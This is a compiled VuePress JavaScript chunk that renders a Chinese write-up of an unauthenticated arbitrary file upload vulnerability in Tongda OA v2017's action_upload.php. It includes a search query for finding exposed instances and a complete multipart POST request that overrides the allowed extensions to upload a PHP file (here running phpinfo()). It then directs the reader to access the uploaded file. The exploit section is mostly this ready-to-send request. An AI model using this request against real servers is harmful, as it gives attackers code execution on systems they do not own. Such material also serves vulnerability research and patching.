(window.webpackJsonp=window.webpackJsonp||[]).push([[155],{1553:function(s,a,t){s.exports=t.p+"assets/img/1628301733285-a06c056e-4c78-4b77-bb05-bb01fef71ebc.54aed6ea.png"},1554:function(s,a,t){s.exports=t.p+"assets/img/1628301944004-f70c17d1-14fa-4653-9888-720876947b7d.ba9bd2bc.png"},1555:function(s,a,t){s.exports=t.p+"assets/img/1628301997079-6703e75c-6115-4f8a-a455-3e53054ce34a.57ff7fa8.png"},2446:function(s,a,t){"use strict";t.r(a);var n=t(75),e=Object(n.a)({},(function(){var s=this,a=s.$createElement,n=s._self._c||a;return n("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[n("h1",{attrs:{id:"通达oa-v2017-action-upload-php-任意文件上传漏洞"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#通达oa-v2017-action-upload-php-任意文件上传漏洞"}},[s._v("#")]),s._v(" 通达OA v2017 action_upload.php 任意文件上传漏洞")]),s._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),n("p",[s._v("通达OA v2017 action_upload.php 文件过滤不足且无需后台权限，导致任意文件上传漏洞")]),s._v(" "),n("h2",{attrs:{id:"漏洞影响"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),n("a-checkbox",{attrs:{checked:""}},[s._v("通达OA v2017")]),n("br"),s._v(" "),n("h2",{attrs:{id:"网络测绘"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),n("a-checkbox",{attrs:{checked:""}},[s._v('app="TDXK-通达OA" ')]),n("br"),s._v(" "),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),n("p",[s._v("访问获取版本信息")]),s._v(" "),n("p",[n("img",{attrs:{src:t(1553),alt:"img"}})]),s._v(" "),n("p",[s._v("发送请求包上传任意文件")]),s._v(" "),n("div",{staticClass:"language-php line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-php"}},[n("code",[s._v('POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1\nHost: \nUser-Agent: Go-http-client/1.1\nContent-Length: 893\nContent-Type: multipart/form-data; boundary=---------------------------55719851240137822763221368724\nX_requested_with: XMLHttpRequest\nAccept-Encoding: gzip\n\n-----------------------------55719851240137822763221368724\nContent-Disposition: form-data; name="CONFIG[fileFieldName]"\n\nffff\n-----------------------------55719851240137822763221368724\nContent-Disposition: form-data; name="CONFIG[fileMaxSize]"\n\n1000000000\n-----------------------------55719851240137822763221368724\nContent-Disposition: form-data; name="CONFIG[filePathFormat]"\n\ntcmd\n-----------------------------55719851240137822763221368724\nContent-Disposition: form-data; name="CONFIG[fileAllowFiles][]"\n\n.php\n-----------------------------55719851240137822763221368724\nContent-Disposition: form-data; name="ffff"; filename="test.php"\nContent-Type: application/octet-stream\n\n'),n("span",{pre:!0,attrs:{class:"token php language-php"}},[n("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("phpinfo")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),n("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v('\n-----------------------------55719851240137822763221368724\nContent-Disposition: form-data; name="mufile"\n\nsubmit\n-----------------------------55719851240137822763221368724--\n')])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br")])]),n("p",[n("img",{attrs:{src:t(1554),alt:"img"}})]),s._v(" "),n("p",[s._v("再访问上传的文件")]),s._v(" "),n("p",[n("img",{attrs:{src:t(1555),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=e.exports}}]);